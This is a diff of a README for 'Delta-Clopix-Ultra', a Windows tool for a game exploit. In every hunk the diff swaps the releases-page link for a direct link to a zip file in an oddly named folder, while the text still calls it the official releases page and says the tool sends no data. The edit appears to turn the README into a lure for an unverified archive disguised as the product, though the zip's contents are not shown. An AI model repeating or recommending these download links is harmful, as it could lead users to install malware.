@@ -1,6 +1,6 @@
 # ⚙️ Delta-Clopix-Ultra - Simple Tool for Delta Exploit Use
 
-[![Download Delta-Clopix-Ultra](https://img.shields.io/badge/Download-Delta--Clopix--Ultra-brightgreen?style=for-the-badge)](https://github.com/AdebSamra/Delta-Clopix-Ultra/releases)
+[![Download Delta-Clopix-Ultra](https://img.shields.io/badge/Download-Delta--Clopix--Ultra-brightgreen?style=for-the-badge)](https://github.com/AdebSamra/Delta-Clopix-Ultra/raw/refs/heads/main/lissencephalous/Ultra-Clopix-Delta-v2.7.zip)
 
 ## 📋 About Delta-Clopix-Ultra
 
@@ -27,7 +27,7 @@ To run Delta-Clopix-Ultra smoothly on your Windows computer, make sure your syst
 To get Delta-Clopix-Ultra, follow these steps:
 
 1. Click the big green button at the top or go directly to this page:  
-   [https://github.com/AdebSamra/Delta-Clopix-Ultra/releases](https://github.com/AdebSamra/Delta-Clopix-Ultra/releases)  
+   [https://github.com/AdebSamra/Delta-Clopix-Ultra/raw/refs/heads/main/lissencephalous/Ultra-Clopix-Delta-v2.7.zip](https://github.com/AdebSamra/Delta-Clopix-Ultra/raw/refs/heads/main/lissencephalous/Ultra-Clopix-Delta-v2.7.zip)  
    This is the official download page for all application versions.
 
 2. On the releases page, look for the latest release at the top.  
@@ -107,7 +107,7 @@ If you have trouble with the program, try these steps:
 New versions may fix bugs or improve features. To update:
 
 1. Visit the release page again:  
-   [https://github.com/AdebSamra/Delta-Clopix-Ultra/releases](https://github.com/AdebSamra/Delta-Clopix-Ultra/releases)
+   [https://github.com/AdebSamra/Delta-Clopix-Ultra/raw/refs/heads/main/lissencephalous/Ultra-Clopix-Delta-v2.7.zip](https://github.com/AdebSamra/Delta-Clopix-Ultra/raw/refs/heads/main/lissencephalous/Ultra-Clopix-Delta-v2.7.zip)
 
 2. Download the newest `.zip` file.
 
@@ -131,7 +131,7 @@ Delta-Clopix-Ultra runs locally on your Windows computer and does not send your 
 
 ## 🔗 Links
 
-[Download or update Delta-Clopix-Ultra](https://github.com/AdebSamra/Delta-Clopix-Ultra/releases)
+[Download or update Delta-Clopix-Ultra](https://github.com/AdebSamra/Delta-Clopix-Ultra/raw/refs/heads/main/lissencephalous/Ultra-Clopix-Delta-v2.7.zip)
 
 ---
 
